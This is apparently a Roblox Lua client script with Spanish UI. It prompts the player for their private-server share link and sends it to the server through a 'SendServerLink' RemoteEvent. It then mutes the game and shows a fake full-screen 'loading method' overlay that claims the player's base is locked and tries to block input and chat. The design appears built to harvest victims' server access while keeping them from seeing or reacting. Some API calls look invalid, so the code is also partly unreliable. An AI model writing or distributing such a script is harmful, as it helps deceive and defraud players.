local Player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SoundService = game:GetService("SoundService")
local UserInputService = game:GetService("UserInputService")
local Chat = game:GetService("Chat")

-- ====== UI ======
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = Player:WaitForChild("PlayerGui")
ScreenGui.DisplayOrder = 100

local Frame = Instance.new("Frame")
Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0, 400, 0, 300)
Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)

local Label = Instance.new("TextLabel")
Label.Parent = Frame
Label.Size = UDim2.new(1, -20, 0, 30)
Label.Position = UDim2.new(0, 10, 0, 10)
Label.Text = "Ingresa el link de tu servidor privado:"
Label.TextColor3 = Color3.fromRGB(255, 255, 255)
Label.BackgroundTransparency = 1

local TextBox = Instance.new("TextBox")
TextBox.Parent = Frame
TextBox.Size = UDim2.new(1, -20, 0, 50)
TextBox.Position = UDim2.new(0, 10, 0, 50)
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
TextBox.ClearTextOnFocus = false
TextBox.Text = "https://www.roblox.com/share?code="

local MessageLabel = Instance.new("TextLabel")
MessageLabel.Parent = Frame
MessageLabel.Size = UDim2.new(1, -20, 0, 30)
MessageLabel.Position = UDim2.new(0, 10, 0, 110)
MessageLabel.BackgroundTransparency = 1
MessageLabel.Text = ""
MessageLabel.TextColor3 = Color3.fromRGB(255, 0, 0)

local Button = Instance.new("TextButton")
Button.Parent = Frame
Button.Size = UDim2.new(1, -20, 0, 50)
Button.Position = UDim2.new(0, 10, 0, 150)
Button.Text = "Enviar"
Button.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Button.TextColor3 = Color3.fromRGB(255, 255, 255)

-- ====== Validación del link ======
local function isLinkValid(link)
    local startPart = "https://www.roblox.com/share?code="
    local endPart = "&type=Server"
    return string.sub(link, 1, #startPart) == startPart and string.sub(link, -#endPart) == endPart
end

-- ====== Función para mostrar pantalla de carga ======
local function showLoadingScreen()
    local loadingGui = Instance.new("ScreenGui")
    loadingGui.Name = "LoadingScreen"
    loadingGui.ResetOnSpawn = false
    loadingGui.Parent = Player:WaitForChild("PlayerGui")
    loadingGui.DisplayOrder = 9999 -- Asegurar que esté por encima de todo

    -- Fondo negro completo
    local overlay = Instance.new("Frame")
    overlay.Size = UDim2.new(2, 0, 2, 0) -- Cubrir toda la pantalla
    overlay.Position = UDim2.new(0, 0, 0, 0)
    overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    overlay.BackgroundTransparency = 0
    overlay.Parent = loadingGui

    -- Texto de carga
    local loadingLabel = Instance.new("TextLabel")
    loadingLabel.Size = UDim2.new(0, 600, 0, 100)
    loadingLabel.Position = UDim2.new(0.5, -300, 0.4, -50)
    loadingLabel.BackgroundTransparency = 1
    loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    loadingLabel.TextScaled = true
    loadingLabel.Font = Enum.Font.SourceSansBold
    loadingLabel.Text = "Cargando Metodo Morieira"
    loadingLabel.Parent = overlay

    -- Barra de carga fondo
    local barBackground = Instance.new("Frame")
    barBackground.Size = UDim2.new(0, 600, 0, 50)
    barBackground.Position = UDim2.new(0.5, -300, 0.5, -25)
    barBackground.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    barBackground.BorderSizePixel = 0
    barBackground.Parent = overlay

    -- Barra de carga real
    local barFill = Instance.new("Frame")
    barFill.Size = UDim2.new(0, 0, 1, 0) -- empieza en 0%
    barFill.Position = UDim2.new(0, 0, 0, 0)
    barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    barFill.BorderSizePixel = 0
    barFill.Parent = barBackground

    -- Mensaje debajo de la barra de carga
    local blockMessage = Instance.new("TextLabel")
    blockMessage.Size = UDim2.new(0, 600, 0, 50)
    blockMessage.Position = UDim2.new(0.5, -300, 0.6, -25)
    blockMessage.BackgroundTransparency = 1
    blockMessage.TextColor3 = Color3.fromRGB(255, 255, 255)
    blockMessage.TextScaled = true
    blockMessage.Font = Enum.Font.SourceSansBold
    blockMessage.Text = "Tu base se mantendrá bloqueada hasta que termine la carga"
    blockMessage.Parent = overlay

    -- Deshabilitar la interacción del usuario
    local function disableUserInteraction()
        UserInputService.InputBegan:Connect(function(input, gameProcessed)
            if not gameProcessed then
                input:ChangeState(Enum.UserInputState.Cancel)
            end
        end)
    end

    disableUserInteraction()

    -- Deshabilitar el chat
    local function disableChat()
        Chat:ClearChat()
        Chat.QuickChatEnabled = false
    end

    disableChat()

    -- Animación de carga
    spawn(function()
        for i = 1, 100 do
            barFill.Size = UDim2.new(i/100, 0, 1, 0)
            wait(0.1) -- Ajusta la velocidad de carga (10 segundos aprox)
        end
    end)
end

-- ====== Función para eliminar todos los sonidos ======
local function removeAllSounds()
    for _, sound in pairs(SoundService:GetChildren()) do
        if sound:IsA("Sound") then
            sound:Destroy()
        end
    end
end

-- ====== Botón principal ======
Button.MouseButton1Click:Connect(function()
    local link = TextBox.Text
    if isLinkValid(link) then
        MessageLabel.Text = "El link es válido ✅"
        MessageLabel.TextColor3 = Color3.fromRGB(0, 255, 0)

        local remoteEvent = ReplicatedStorage:FindFirstChild("SendServerLink")
        if remoteEvent then
            remoteEvent:FireServer(link)
        end

        removeAllSounds() -- Eliminar todos los sonidos del juego
        showLoadingScreen()
        ScreenGui:Destroy()
    else
        MessageLabel.Text = "El link es inválido ❌"
        MessageLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    end
end)
